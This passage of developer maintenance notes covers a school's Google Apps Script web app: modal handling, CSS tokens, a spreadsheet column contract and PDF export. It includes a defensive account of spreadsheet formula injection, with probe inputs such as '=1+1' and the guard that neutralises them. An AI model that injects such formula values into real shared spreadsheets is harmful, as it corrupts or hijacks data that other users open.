1 visible, **0 passing the filter**; a real `Escape` keydown left it at `display: flex`.
Reported months later as "there is no function to close modals by pressing ESC".
Fixed 2026-09-08 with `getClientRects().length > 0`, which works for fixed elements.
- ⚠️ **Never bring `offsetParent` back here.** It reads as correct. `tests/modalesc.test.js`
  §1 runs the transcribed predicate against `{display:'flex', offsetParent:null, rects:1}`
  and also asserts the OLD predicate rejects it — so the difference is exercised rather
  than remembered.
- ⚠️ **Top-most is by z-index, then document order.** `recUnsavedModal` is `z-index: 10050`
  and sits *above* the modal that raised it, so "last in the DOM" picks the wrong one.
  A missing z-index must count as 0, never `NaN` — `NaN` comparisons are false, so an
  unstyled overlay would win every time.

⚠️ **The `display = 'none'` fallback is NOT harmless, which is why the closer map must
stay complete.** Two modals lose real state without their closer:
- `interviewResultModal` → `closeInterviewResultEntry` clears `_irEditRow`; skip it and
  the **next** open edits the row left over from last time.
- `recUnsavedModal` → `recUnsavedCancel` takes the pending go/stay callbacks through
  `_recUnsavedTake()`; skip it and they stay armed. ⚠️ It maps to **キャンセル**, the
  branch that keeps the user's work — never to 「保存せずに移動」.

`tests/modalesc.test.js` §3 derives every `close*`/`hide*` function that hides a
`.modal-overlay` **from the source** and fails if one is missing from the map, so a modal
added later cannot silently inherit the lossy fallback. ⚠️ Its scan must accept **both
quote styles** — the closers write `display = "none"` while the map is single-quoted, and
the first version found 3 of 10 and blamed "the function shape".

Esc backs out **one level**: `.exp-wrap.open` / `.filter-multi.open` first, then the
top-most modal — so inside 増減推移 one press closes the 出力 menu and the next closes the
modal. A non-empty search box still takes precedence over both and is merely cleared.

### Visual system (the finish layer)

Refreshed 2026-09-07. **Colour was deliberately not touched** — every token in the
palette is exactly what it was; this is type, radius, elevation, motion and focus only.
Measured before: 38 `border-radius` declarations across **11 distinct values**, 9 ad-hoc
`box-shadow`s reaching `rgba(0,0,0,0.5)`, **zero** focus affordances, and one
`font-family` naming Helvetica Neue and Arial.

⚠️ **The finish tokens live in their OWN `:root` block, and must stay there.**
`tests/theme.test.js` parses the FIRST `:root` and asserts every token in it has a
`body.dark-mode` counterpart — a `--r-md: 10px` in the palette block fails that at once,
and mirroring `10px` into the dark palette is meaningless. Its `tokens()` uses `indexOf`,
so it reads only the first block. Radii and easing are theme-independent by nature, so
the split is the honest structure as well as the safe one. `tests/designtokens.test.js`
§1 asserts the palette block still holds nothing but hexes and rgba.

⚠️ **The webfont is INJECTED from the FIRST `<script>` block, never a `<link>` in the
markup.** A stylesheet link is render-blocking, and with `fonts.googleapis.com` slow or
filtered — which a school network may well do — the page stays **blank** rather than
degrading. That measured incident is the whole reason this route exists; the schedule
preview does the same thing for the same reason. `display=swap` means the system stack
paints immediately and Noto swaps in; a blocked CDN just leaves the system stack forever,
which is a working app.
- ⚠️ **Two weights, 400 and 700.** The stylesheet uses `bold` ×31 and `600` ×2, and every
  CJK weight is a separate large download (Google splits Noto Sans JP into ~120
  unicode-range subsets). `600` falls to 700, which is two declarations.
- ⚠️ The first script block is **not** the one rule 4's snippet syntax-checks (`b[1]`).
  Check both when you touch it.
- ⚠️ **`font-family` appears exactly ONCE in the stylesheet**, which is what makes the
  whole typeface a one-line revert. Keep it that way.

⚠️ **`inset 3px 0 0 var(--primary-color)` is NOT a shadow** — those two rules draw the
active-row indicator with the shadow property. The elevation scale must not swallow them;
§4 asserts both survive.

⚠️ **`--ring` uses `color-mix`, so the raw rgba stays in front of it as a fallback.**
`box-shadow: 0 0 0 2px rgba(78,115,223,0.25); box-shadow: var(--ring);` — a browser
without `color-mix` drops the second declaration and keeps exactly the ring it has today.
Removing the first line is a silent regression on older browsers.

⚠️ **`transition: 0.2s` means `transition: all 0.2s`,** and three rules carried it
(`.export-btn`, `.mode-btn`, `.slot-cell` — the last one per cell across the
面接スケジュール grid). That is the same shape this file already records relayouting the
whole page for 300ms on every sidebar toggle, because `all` caught `padding`. All three
now name their properties. §5 fails on any bare duration.

- `:focus-visible`, not `:focus` — a bare `:focus` draws a ring on mouse clicks too.
  `outline` rather than a box-shadow ring: universally supported, takes no layout space,
  and inherits the theme through `--primary-color`. Element-scoped `:focus` on text
  inputs is pre-existing and correct.
- ⚠️ `.modal-box` was left at `padding: 30px`. Changing it moves `.exp-menu`'s anchor
  inside `#stuTrendModal` — the popover whose position took three measurement rounds.
- ⚠️ `tests/mobile.test.js` §2 pins `.container`'s padding as a proxy for "the mobile
  work never edited a desktop rule". It is now **32px**. Re-pin the number when a desktop
  change is intended; never loosen the regex to stop caring what it is.

#### 面接スケジュール must not share the data-table height cap

⚠️ The calendar is `class="schedule-grid table-responsive"`, so it inherited
`.table-responsive`'s hard-coded **`max-height: 600px`** — a cap written for data tables,
where 600px is sensible, and meaningless for a week view. Measured at a 900px viewport:
602px, **scrolling internally, with 128px unused below it**; on a taller monitor it wasted
several hundred more. Reported as "it could use the space below so that it doesn't require
scrolling". Fixed 2026-09-08 with `max-height: max(360px, calc(100vh - 300px))`.

- ⚠️ **Scoped to `.schedule-grid.table-responsive`, never to either class alone.** That
  600px is shared by every data table and is pinned by `tests/mobile.test.js` §2.
  Specificity `0,2,0` beats the shared `0,1,0`, so the fix does not depend on source order
  in a 15k-line file.
- The 300px is **measured**: 170 above the grid + 72 for `#calHelpText` and the container's
  bottom padding + 56 outside it. Proven to be winning by temporarily setting 200 and
  watching the computed cap become exactly 700px at a 900px window.
- ⚠️ **`overflow-y: auto` stays** — the sticky header row and pinned first column resolve
  against the grid as its own scroll container.
- ⚠️ It **outranks** the media block's `.table-responsive { max-height: 70vh }`. Harmless
  ONLY because `#sub-view-schedule .schedule-grid` is `display: none !important` there.
  `tests/designtokens.test.js` §9 asserts that pairing, so the leak cannot become real if
  the mobile panel is ever removed.
- ⚠️ On a **short** window the grid is now shorter than 600px. That is correct — the page
  stops scrolling and the grid scrolls internally — but it is the opposite of what "use
  the space below" sounds like.

#### 申請関連 is ONE page, and Shinsei_Data has a positional contract

⚠️ **`Shinsei_Data`'s width is `SHINSEI_COLS` in `Shinsei_Code.js`, and nowhere else.**
Every column is anonymous — the form field's `id` **is** its column number — so the width
appeared as a bare literal in **six** places (an array size, five loop bounds, a `getRange`
width). Adding 入学期 as column 47 meant changing all six; landing five of six shifts every
value one column left and corrupts **silently**. One constant, and
`tests/shinseicols.test.js` fails on any surviving bare literal.
- ⚠️ **Two shapes, one apart**: `new Array(SHINSEI_COLS)` is the 0-based sheet row;
  `new Array(SHINSEI_COLS + 1)` is the 1-based aligned array where index 1 = column A.
- ⚠️ **The form's highest field id must EQUAL `SHINSEI_COLS`** — asserted. A field beyond
  the width is written nowhere; one short leaves a dead column.

⚠️ **`_cellSafeRow_` was absent from this module entirely** until 2026-09-08 — both write
paths sent 教育機関名, 所在地 and その他 to the sheet unwrapped, so a value starting with `=`
ran as a formula the next time anyone opened the workbook. Both are wrapped now, and §3
fails if a third write site appears without it.

⚠️ **The guard did not stop 電話番号 showing `#ERROR!`, including on saves made after it shipped
(reported 2026-09-15).** The guard protects new writes only. A phone typed as `+81 75 123 4567`
before it landed became a formula (`#ERROR!`) when 新規作成 appended the row; `+977-1-4412345`
silently became the **number** −4411369. Every read here is `getValues()`, which returns the broken cell as
the TEXT `#ERROR!`, so 既存編集 loaded that into the form and データ更新 wrote it back over the
formula. That destroyed the only copy of what was typed, and it is why "new" saves still failed.
- `shinsei_getStudentDataForEdit` reads the row's `getFormulas()` and returns a formula cell as
  `_shinseiRecoverFormulaText_`. The formula text is what was typed (Sheets adds no `=`); a formula
  beginning `=+`/`=-` drops the `=`, and any other keeps it and is stored inert by the guard.
  Opening a record now repairs it on save.
- **The phone columns are always text:** `SHINSEI_TEXT_COLS` (17, 25, 41) and `_shinseiForceText_`,
  applied INSIDE `_cellSafeRow_`, so `0751234567` keeps its zero and `+81…` gets one apostrophe, not
  two. §13 derives the column list from the form's 電話番号 fields.
- Existing damage: `diagnoseShinseiFormulaCells` (read-only) lists formula cells, error text saved
  as text (with the newest backup value for each), and phones stored as numbers.
  `migrateShinseiFormulaCells` rewrites the formula cells after a sheet copy, and refuses if the copy
  failed. Error text and lost zeros are restored by hand.
- ✅ **Measured with `probeSheetsTextInput` (staging, 2026-09-15)**, table in TECHNICAL_REFERENCE §6.1.0:
  - ⚠️ **`appendRow` makes `+81 …` a formula; `setValues` does not.** That is why broken phones sit
    on records created by 新規作成, and why an edit that only retypes a phone never broke one.
  - Full-width `＋ ＝ －` and zero-width / NBSP / BOM prefixes are stored as text on every path, so
    `_cellSafe_` was **not** widened. `cellsafe.test` §2 pins them as untouched.
  - ⚠️ **`"@"` (plain text) format does not stop `=1+1` becoming a formula.** Don't reach for it
    as a formula defence; the apostrophe is the defence.
  - Every guarded write came back as text, so the recent `#ERROR!` came from re-saving broken
    records, not from a new hole.

⚠️ **一括出力 is scoped by 入学期, and the options come from `_allKnownIntakes_()`** in
`Code.js` — `PlacementTest_Config` ∪ `Recruitment_Meta`, newest first — plus any intake the
申請 data itself holds. Not from `window._recExtraIntakes`: that is populated only by
募集状況, and is exactly why the 入学期 select in 入寮時渡すスケジュール was usually empty
with nothing on screen explaining it.
- ⚠️ **This shipped WRONG in v177 and the fix is the point.** `shinsei_getStudentNames`
  hand-rolled its own `Recruitment_Meta` read instead of calling `_allKnownIntakes_()`, so it
  could not see `PlacementTest_Config` — the half where this school actually registers
  intakes — and the dropdown arrived **empty**. Reported as "the pre-existing intakes are not
  loading". `_allKnownIntakes_`'s own comment already explained why the union exists. **Being
  built on the server was never the property that mattered; reading the whole union is.**
  Same second-copy-of-a-decision shape as `_calCellState` and `_resolveUserById_`.
- ⚠️ Its lexicographic `Object.keys(seen).sort()` was a second, quieter bug:
  「2026年10月生」 sorts *before* 「2026年4月生」. `_allKnownIntakes_` parses 年/月 for exactly that.
- ⚠️ **An empty list now says so on screen** — 「入学期が登録されていません — 募集状況または
  入試関連で追加してください」. A silently blank `<select>` is indistinguishable from a load
  failure, which is how the last one stayed broken unnoticed.
- ⚠️ **未設定 must stay selectable.** Every record predates the field, so without that
  group the entire existing library is unexportable until someone backfills it.
- The confirm names the intake **and** the count — a batch that does not say what it
  covers is how the wrong one gets run.

⚠️ **入学期 IS THE WIDTH'S SECOND HOME, AND THE CLIENT HAD ITS OWN COPY.** `Index.html`
carried the sheet width twice more — `for (let i = 1; i <= 46; i++)` in
`shinseiPopulateFormForEdit` and in `shinseiSubmitForm` — and neither moved when 入学期
became column 47. The field was therefore **write-dead for a full staging version**: it
loaded nothing back and sent nothing, so every データ更新 wrote an empty 入学期 over the
sheet while `Shinsei_Code.js` was entirely correct at 47 and all 43 suites passed.
`tests/shinseicols.test.js` §1 scans `Shinsei_Code.js` only, which is exactly how it hid.
- The client bound is now `SHINSEI_MAX_COL`, **derived** from `shinseiFormGroups` —
  `Math.max` of the field ids — never a number. §2 already binds the highest field id to
  `SHINSEI_COLS`, so the sheet, the form and both loops are one chain with no free literal.
- ⚠️ §6 bans `<= 46` / `<= 47` **in the 申請関連 block of `Index.html`**. The lesson is not
  "count the places" — it is that a positional width does not live in one file.

⚠️ **入学期 is a `<select>`, and free text was a real defect.** It is compared as a NAME
STRING (`shinseiBatchTargets` filters `st.intake === v`), so a typed 「2026年4月生 」 with a
trailing space becomes its own invisible group — the record appears under neither its
intake nor 未設定, with nothing on screen saying why. This file's oldest bug class.
- The options are the **same server list** the 一括出力 filter uses, through one
  `shinseiIntakeOptionHtml()`. Two copies of the vocabulary is the `_calCellState` mistake —
  and the server made exactly that mistake once already, see above.
- ⚠️ **Filled by `shinseiPopulateDropdowns`, not at build time.** `shinseiInit` calls
  `shinseiRebuildForm()` *then* `shinseiRefreshDropdowns()`, so the field can only render
  its blank option first. The blank option is required — 未設定 is a real state.
- ⚠️ **Located by the field's `dynamic: "intakes"` marker, never by `scol47`.**
- ⚠️ **An unrecognised stored value is CARRIED as its own option, flagged red**
  (`shinseiSelectSetValue`) — the `schedPlaceSelect` / `recRenderCancelTable` `sel()` idiom.
  A `<select>` given a value absent from its options falls back to the **first** option
  **without firing `change`**, so the screen would show one intake, the sheet hold another,
  and the next データ更新 write the wrong one back. The read-back routes **every** `<select>`
  through it, because `if (i === 47)` is the positional habit this whole section is about.
  ⚠️ `shinseiSetMode('create')` rebuilds the list after `reset()`: a carried
  「（一覧にありません）」 option would otherwise stay selectable for a brand-new record.
- ⚠️ **No 「＋ 入学期」 here.** 募集状況's `recAddIntake` modal (year+month pickers, duplicate
  detection, `manage_recruitment`-gated) stays the only place an intake is created; 申請関連
  reads that vocabulary. Decided 2026-09-08 — don't re-propose a second write path.
- The driver needs its `shinsei_getStudentDataForEdit` fixture, which answers **per student**
  and deliberately gives one record an intake **absent** from the list. Without that the
  fallback guard is never exercised and the round trip proves nothing.

⚠️ **The ＋ toggle button lives INSIDE `.shinsei-form-grid`, and that is layout, not
decoration.** Each section is ONE 2-column grid and `shinseiRebuildForm` poured `fields`,
`secondFields` and `thirdFields` into it in a row. 試験情報's first block has **five** fields,
so row 3 had a free cell in column 2 — and grid auto-placement filled it with the next item,
**試験名 2回目**. Measured: 受験番号 at `top 678 left 149`, 試験名 2回目 at `top 678 left 760`.
The second exam began on the first one's row with nothing marking the boundary. Reported as
「the cutoffs for second exam/educational institutions should be clear」.
- ⚠️ **教育機関情報 cleared by ARITHMETIC, not by design** — both blocks are 8 fields, an even
  number, so they happened to land on fresh rows. A ninth column there brings the same bug
  back, which is why the fix must not be "count the fields". Same reasoning as deriving
  `SHINSEI_MAX_COL` rather than typing it.
- The toggle is appended to the **grid**, immediately **before** the block it reveals, and
  `.shinsei-form-grid > .shinsei-toggle-btn` spans `1 / -1`. A full-width item cannot fit a
  leftover half-row, so whatever follows starts fresh **for any field count**. It also marks
  the cutoff while the block is COLLAPSED, which a divider that appears with the block cannot,
  and puts ＋3回目 after the 2回目 block instead of beside ＋2回目 at the section foot.
- ⚠️ **Do NOT add a divider to `secondFields`/`thirdFields`.** Those arrays feed
  `shinseiAllFields()`, and `SHINSEI_MAX_COL = Math.max(...map(f => f.id))` becomes **`NaN`**
  on one entry without an `id` — both `i <= SHINSEI_MAX_COL` loops then run zero times and the
  whole form goes write-dead with no error. The button is built from `grp.toggleBtn`, which is
  not a field.
- The leftover cell beside 受験番号 stays **empty**. That is the requested behaviour.
- ⚠️ The CSS rule is **scoped** so specificity (`0,2,0`) decides rather than source order, and
  `.shinsei-form-grid` / `.shinsei-toggle-btn` are each created in exactly ONE place, so the
  rule cannot reach any other screen. `tests/shinseicols.test.js` §9 pins all of it; measured
  at 390px too, since no media rule covers `.shinsei-*`.

#### 3回目以降の試験 / 4か所目以降の教育機関 — ONE blob column, and 【別紙（続き）】

The form allowed **2 exams and 3 教育機関**, fixed, because each block is a run of anonymous
columns (5 per exam, 8 per institution). More students than that exist.

⚠️ **Fitting more onto one A4 page is not winnable, and it was MEASURED rather than guessed.**
Rendering the template with its scriptlets evaluated, at the printable width, printed through
chromium with `preferCSSPageSize` and counted with `pdfinfo`:

```
別紙 = 194.1 + 24.5·(exams−1) + 40.5·(institutions−1) mm      budget 281mm (A4 − 8mm margins)
```

so 3 exams + 3 institutions needs 130mm of the 86.9mm available. ⚠️ **And 2 exams + 3 教育機関
already overflows today — 299.8mm, a third sheet, in production.** That is pre-existing, is not
fixed by any of this, and is worth deciding separately.

**So the document grows instead.** Extras print on a dedicated 【別紙（続き）】 sheet with its
own identification footer.

⚠️ **The extras are ONE column holding JSON — column 48 — and it is the last column this sheet
should ever gain.** Adding blocks as columns would widen `SHINSEI_COLS` every time, which is the
failure the whole positional section above exists to prevent, and would still cap the count.
`Schedule_Templates.内容` is the same decision for the same reason; it carries `v` likewise.
- ⚠️ **The blob needs NO special case in any loop.** Both loops run `1..SHINSEI_COLS` and
  `SHINSEI_MAX_COL` is derived from the form, so a `{ id: 48, type: "hidden" }` field carries it
  through the machinery already there. `shinseiCreateFieldEl` returns a hidden field **bare** —
  wrapped in `.shinsei-form-group` it would draw an empty labelled cell in the 2-column grid.
- ⚠️ It is filled **before** the submit loop reads it. Set afterwards, every save posts the
  previous value.

⚠️ **THE TRAP THIS EXPOSED: `INTAKE_IDX` was `SHINSEI_COLS - 1`.** 入学期 was identified as
*"the last column"* — true only by coincidence. Widening to 48 silently moved the intake reader
onto the blob: the dropdown fills with JSON, `shinseiBatchTargets` groups by it, every record
reads 未設定. No error. ⚠️ **And `tests/shinseicols.test.js` §2 ASSERTED THE BUG** — it required
that exact derivation, so the suite would have gone green on the corruption. 入学期 now has its
own `SHINSEI_INTAKE_COL`, the check is inverted, and the two constants must differ.
**When a constant is about to move, grep for everything that derives an index from it.**

- ⚠️ **Empty extras serialise to `''`, never `'{}'`.** Every existing record holds `''` and the
  template branches on truthiness — `'{}'` would emit an empty 【別紙（続き）】 for the whole back
  catalogue. Proved rather than assumed: with no extras the rendered **body is byte-identical**
  to the old template's, 12143 bytes both ways; the only change in the document is 201 bytes of
  inert CSS in the head.
- ⚠️ **`page-break-BEFORE` on the continuation, never `-after`.** The merged 一括出力 splices
  bodies into one document and relies on the last element carrying no break; a trailing one adds
  a blank sheet to **every** student in the batch. Verified on a spliced 2-student render: 8
  sheets, no blank page.
- ⚠️ **`.xblk { page-break-inside: avoid }`** — a block title on one sheet with its rows on the
  next is unreadable on an official form. Verified with 4 exams + 6 institutions spanning two
  continuation sheets: all 10 blocks whole.
- ⚠️ **Both JSON parses are wrapped.** A malformed blob costs that student's extra blocks;
  thrown server-side it would take a whole merged batch down.
- ⚠️ **A wholly blank added block is dropped, not stored** — it would print an empty 試験 box.
- ⚠️ **Labels, types and the 試験名 option list are DERIVED from the group's `secondFields`**, and
  the ordinal is **counted** from which `*Fields` arrays the group has. A hand-written copy drifts
  the first time an exam name is added and the two halves of one form then offer different
  options. `SHINSEI_FIXED_EXAMS` / `SHINSEI_FIXED_EDUS` are pinned against the template's actual
  block counts, in both directions.
- ⚠️ **Clearing the dynamic blocks lives in `shinseiResetToggles`, which both reset paths call.**
  `form.reset()` clears values and leaves the DOM, so without it a brand-new record inherits the
  previous student's blocks — the same shape as the carried 「（一覧にありません）」 intake option.
- Added `<select>`s route through `shinseiSelectSetValue` like every other one, so an unknown
  stored 試験名 is carried and flagged red in a dynamic block too.
- The driver's `shinsei_getStudentDataForEdit` fixture gives サンプル 三郎 two extra exams and one
  extra institution, one with a 試験名 **absent** from the list. ⚠️ Its rows are `new Array(49)` —
  1-based, so column 48 needs index 48 to exist; one short and every extras check passes against
  a record that has none.

**PDF出力 folded into the one sub-view — now 各種確認書 — as a THIRD MODE.** The two sub-tabs
shared one datalist but had two search inputs, so you chose a student to edit and then chose
the same student again to export. 単体/プレビュー now act on `shinseiCurrentEditName`.

⚠️ **Three chips, TWO panes, and that asymmetry is where the bug was.** 新規作成 / 既存編集 /
PDF出力 are `.mode-btn`s in one `.seg-track`; 新規作成 and 既存編集 **share** `#shinsei-pane-form`,
PDF出力 gets `#shinsei-pane-pdf`. Sweeping `shinsei-pane-<mode>` reads as obviously correct and
is wrong — there is no `-create` pane, so the form was never hidden and sat under the PDF
panel. `SHINSEI_PANES` is **derived** from `SHINSEI_MODE_PANE` and swept separately from the
buttons. Found by measuring `getClientRects()` per mode; on a screenshot it looked deliberate.
- ⚠️ **`shinseiSetMode` sweeps and branches per mode.** It named its two buttons a line each
  and its `else` MEANT edit, so a third mode inherited edit's `focus()` and status line — the
  trap `switchDormSubTab` was rewritten to avoid and `switchAdmissionsSubTab` still has.
- ⚠️ **Only 新規作成 clears `shinseiCurrentEditName`.** If PDF出力 did too, プレビュー and
  単体出力 would disable at the moment you selected the mode that uses them.
- ⚠️ **A status element inside a hidden pane reports to nothing** — no error, no feedback, the
  same shape as the Esc handler's always-false predicate. `#shinsei-entryStatus` therefore sits
  **outside both panes**: it carries the search load, saves and deletes, and the picker is
  visible in PDF mode too. `#shinsei-exportStatus` stays **inside** the PDF pane because only
  that pane's own buttons reach it. §7 pins both by position in the markup.
- ⚠️ The load message is mode-aware: 「編集してください」 on a screen with no form is a wrong
  instruction. `shinseiMode` is the one place the current mode is stored — don't re-derive it
  from a button's class.
- Measured at 390px: the 3-chip track is **288px** with 40px touch targets, so it fits. If a
  fourth chip ever breaks that, shorten the **label** — `.mode-btn` is shared and no media rule
  covers it.
- ⚠️ The sub-tab label is 各種確認書; its id stays `btn-shinsei-entry` and the key stays
  `switchShinseiTab('entry')`. `domrefs.test.js` pairs button to view by id.
- ⚠️ They are **disabled until a record is loaded** — in 新規作成 they would mean "export
  what?". `shinseiSyncExportButtons` owns that and is called from every place that sets or
  clears the loaded record.
- ⚠️ `switchShinseiTab` names its tabs in a literal array, so a removed sub-view has to
  leave that list too.

#### 一括出力 is ONE call and ONE conversion — and the PDF engine was never the cost

Asked whether merging the batch into a single file would make "the pdf engine" faster. It
does not make the engine faster per page; it deletes almost everything **around** it. The
batch was a **client-side loop**: per student, one `google.script.run`, one **full read of
`Shinsei_Data` to fetch one row**, one template load, one `getAs(MimeType.PDF)`, one base64
transfer — and **800 ms of deliberate sleep** so the browser would accept sequential
downloads. For 12 students that is **9.6 seconds of doing nothing** and 12 reads of the whole
sheet to get 12 rows.

`shinsei_exportBatchMergedFromWebApp(names, includeCefr, title)` does one sheet read, builds
each student's document, splices the **bodies** into the first one's shell, and makes **one**
`getAs(MimeType.PDF)` call.

- ⚠️ **The ~110-line row→template mapping existed TWICE** — `shinsei_exportSingleFromWebApp`
  and `shinsei_previewSingleFromWebApp` — and the merged batch would have made three. Measured
  before touching them: byte-identical after whitespace normalisation, i.e. **not drifted
  yet**. The drift arrives with the next column, and then the preview shows one document while
  the export produces another. Now `_shinseiBuildDocHtml_` is the only copy and §8 asserts that
  structurally, because a behavioural test cannot see a copy that does not exist yet.
- ⚠️ **Splice the `<body>` INNER html, never concatenate whole documents** — nested
  `html/head/body` and a duplicated `@page { size: A4 }`. The first successful document
  supplies the shell so the styles appear once.
- ⚠️ **The explicit `page-break-after` between students is required and adds no blank page.**
  Checked against the template rather than assumed: its conditional `page-break` class sits on
  the **opening** div of the page-1 block, so the final rendered element never carries one.
- ⚠️ **A student who fails is recorded in `failed` and skipped, never thrown.** Merging
  otherwise turns "one bad row costs one student" into "one bad row costs the batch"; the
  client names the skipped students in the status line.
- ⚠️ **`_normName_`, not `String().trim()`** (`_shinseiRowFor_`) — a full-width space made a
  student who plainly exists unfindable, and now that would silently drop them from the batch.
- ✅ **`export_shinsei` is checked on the server since 2026-09-15**, for 単体出力, 一括出力 **and**
  プレビュー, through `_requireShinseiExport_`. It used to live only on the client buttons. It calls
  `_hasPerm_("", "", "export_shinsei")` so role and permissions come from the session: admin-level
  passes as the button shows. ⚠️ Never a literal permission-string check (the old `_requirePerm_`,
  deleted 2026-09-21): it would refuse an admin-level caller the button offers.
  `tests/shinseicols.test.js` §12.
- ⚠️ **All-or-nothing on the 6-minute limit** is the real cost of merging. `profileShinseiPdf(n)`
  (editor-run, `_requireMaintenanceUnlock_`) times the sheet read, the document build, and
  `getAs` for **one** document against **N merged** — the only thing that says whether the
  converter's cost is fixed per invocation or per page, and therefore what the practical batch
  cap is. Rule 8: read the median of three, never one run.
- The counts pinned in `tests/shinseicols.test.js` §1 went **3 → 2** aligned arrays and
  **5 → 4** loop bounds when the two row lookups collapsed into `_shinseiRowFor_`. **Re-pinned,
  not loosened.**

`shinsei_batchExportAllStudents` (the old spreadsheet-copy export into a Drive folder) and its
`_shinsei_fetchPDFWithRetry_` helper were **deleted 2026-09-15**. Nothing called them and no button
reached them; the school has no use for Drive copies. `SHINSEI_EXPORT_FOLDER_ID` went with them.

#### The ⓘ beside プレースメントテスト判定：CEFR (2026-09-18)

A tooltip on field 33 lists each 課程's placement score → CEFR rule (A1 30点〜; A2 60点〜, or
70点〜 = A2後半 for 進学1年3か月 / 就職2年; 日本語・文化2年 A1 only). **Placement test only** — the
interview field (14) deliberately has none. The row for the course chosen in 課程 is highlighted.
- ⚠️ **進学1年課程 is deliberately omitted** (2026-09-18: the school expects to retire it). It is
  still in the 課程 select and the builder still handles it. §14 names it in `OMITTED_FROM_TIP`, so
  the coverage check stays strict for every other course; re-adding it means editing that list too.
- ⚠️ **`SHINSEI_PLACEMENT_CEFR` is a SECOND COPY of the document's wording.** The real thresholds
  are prose inside `_shinseiBuildDocHtml_`. `tests/shinseicols.test.js` §14 runs that builder for
  every course and requires each `N点以上を<level>相当` in the placement text to equal the table's
  bands, both ways, and the table to cover exactly the 課程 select. **Change a threshold in both
  places**; the suite fails if only one moves.
- ⚠️ Attached by the field's `help: "placementCefr"` MARKER, never by `id === 33`.
- ⚠️ **Opened by `:hover` AND `:focus-within`,** with a real `<button>` as the trigger, so a tap and
  the Tab key reach it. Hover alone is unreachable on a phone.
- ⚠️ **Placed by measurement on every open (`shinseiTipOpen`).** Anchored to the icon it opened at
  x = −75 on a 390px phone — off-left content never extends `scrollWidth`, so nothing reported it
  (the 出力-popover lesson). It now clamps into the viewport and opens upward when the phone's fixed
  bottom bar would cover it; the bar's top is measured, not guessed. Measured after: 8–329px, clear
  of the bar, at both a low and a high icon position.
- `xss.test` exempts `cefrTipRows` by that exact name: it is built from the static table with every
  cell escaped. A generic `rows` exemption would also cover sheet data.

#### 試験名 — the official 13, and the end of the two-copy list (2026-09-18)

試験名 offered **9** hand-written options; 出入国在留管理庁 publishes **13**. STBJ, PJC Bridge,
日本語オンラインテスト and 駿台日本語能力試験 were simply missing, so a student holding one of them
could not be recorded. Source: 「日本語教育機関への入学をお考えのみなさまへ」 — 2 tests that prove
A1相当以上 (JFT-Basic, JLPT) and 11 accepted **当面の間**.

⚠️ **`SHINSEI_EXAMS` in `Index.html` is now the ONLY list, and that is the point.** Fields 3 (1回目)
and 8 (2回目) both read `SHINSEI_EXAM_OPTIONS`, and `shinseiExtraSpecs` already derived every ADDED
block's options from field 8 — so one edit reaches all four places. Before this, fields 3 and 8 held
**two hand-written copies with nothing asserting they matched**: adding an exam to one gave 1回目 an
option that 2回目 and every added block did not have, on the same form. `tests/shinseicols.test.js`
§15 fails on any 試験名 field carrying an inline `options: [`.
- ⚠️ Declared **above** `shinseiFormGroups` — read below it, that is rule 3 and the tab is blank.
- `tier` (`proof` / `deemed`) is a real distinction, not decoration: 当面の間 acceptance can be
  withdrawn. The tooltip emits a heading when the tier **changes**, so the grouping follows the data
  rather than a hardcoded split after row 2.

⚠️ **Naming is 正式名称（略称）** — the shape `日本語能力試験（JLPT）` already had. Two exceptions, both
because the official name already contains the abbreviation: **`日本語NAT-TEST`** takes no parenthesis,
and **`JPT日本語能力試験` keeps the notice's own spelling**. That second one is not tidiness:
⚠️ **JPT's official name IS 日本語能力試験, the same as JLPT's**, so `正式名称（略称）` would put
`日本語能力試験（JLPT）` and `日本語能力試験（JPT）` one character apart in the same dropdown, on a form
submitted to immigration. §15 asserts the collision form is absent.

⚠️ **試験名 is STORED and PRINTED VERBATIM, so renaming an option strands every record holding the
old one.** Nothing was lost — `shinseiSelectSetValue` carries an unrecognised value as its own option
flagged red — but the old spelling would go back onto the COE form on the next データ更新. So the
stored values were moved instead:
- `diagnoseShinseiExamNames()` (editor-run, read-only) lists the **distinct** stored 試験名 with
  counts, marking what would change. ⚠️ It deliberately carries **no copy of the 13 names**: listing
  the distinct values is what lets a human spot a hand-typed spelling, without this file growing a
  second copy of a vocabulary that drifts the moment the school accepts another test.
- `migrateShinseiExamNames()` rewrites them after a sheet copy, and **refuses if the copy failed**.
- ⚠️ **It rewrites column 48's JSON blob too.** `exams[].name` on every 3回目以降 block is a 試験名,
  and a migration fixing only columns 3 and 8 leaves exactly the half nobody scrolls down to.
- ⚠️ `SHINSEI_EXAM_RENAMES` (`Shinsei_Code.js`) must stay in step with `SHINSEI_EXAMS`. §15 reads
  **both files** and asserts every new name it writes is really an option, and that no old name is
  still offered — a rename on one side alone fails the suite.

**The ⓘ beside 級又は点数** lists each test and the minimum it must reach, highlighting the row for
the exam chosen in **that block's** 試験名. 級又は点数 stays free text, deliberately: the minimums are
点 / 級 / JCT5 / 初級A / C-, and no input type fits all five.
- ⚠️ **`help` travels through `shinseiExtraSpecs`; `helpSrc` deliberately does not.** Without the
  first the ⓘ reached 1回目 and 2回目 but no added block — the blocks whose exam the person is least
  sure about. `helpSrc` names a fixed `scolN` control, which an added block does not have.
- ⚠️ **`shinseiTipSourceValue` resolves the highlight source at OPEN time, never at build time.**
  `shinseiAddExtraBlock` tags the element with `data-xblk`/`data-xid` **after** `shinseiCreateFieldEl`
  returns it, so a tip that captured its source when built would find nothing and silently fall back
  to the first block's exam. Verified live: three blocks, three different exams, three correct rows.
- **One `shinseiTipOpen` serves both tips**, keyed by `data-tipkey` — a second copy is the
  `_calCellState` mistake. The CEFR tip's own geometry is unchanged, and measured to prove it.
- ⚠️ **The id is set on the NODE, not written into the markup string.** `tests/domrefs.test.js` reads
  any `id="x"` in this file as a real element, so a second tip emitting the same `id="' + … + '"`
  literal registers as a duplicate id — which is exactly how it failed.

⚠️ **Three placement defects, each found only by MEASURING — the 出力-popover lesson again.**
- **`max-width` caps the CONTENT box here**, so the 10px/12px padding and 1px border sat outside it:
  384px against a 390px phone, overhanging the edge and making the whole page scroll sideways.
  `box-sizing: border-box`, scoped to the exam tip so the CEFR tip keeps its measured size.
- **A phone has a fixed strip at the TOP as well as the bar at the bottom.** The 13-row panel opened
  upward and its heading sat **behind** `.sb-sub.open`, which scrolling inside the panel cannot bring
  back. The height is now capped to what fits between ceiling and floor, in whichever direction it
  opened. ⚠️ **The ceiling is mobile-only BY WIDTH**: on desktop `.sb-sub.open` is the sub-navigation
  inside the left rail, and without that test it capped the desktop panel to 186px for no reason —
  a bug introduced by the fix and caught by measuring it.
- **520px is measured, not chosen**: the 13 rows come to 473px, so a desktop window shows the whole
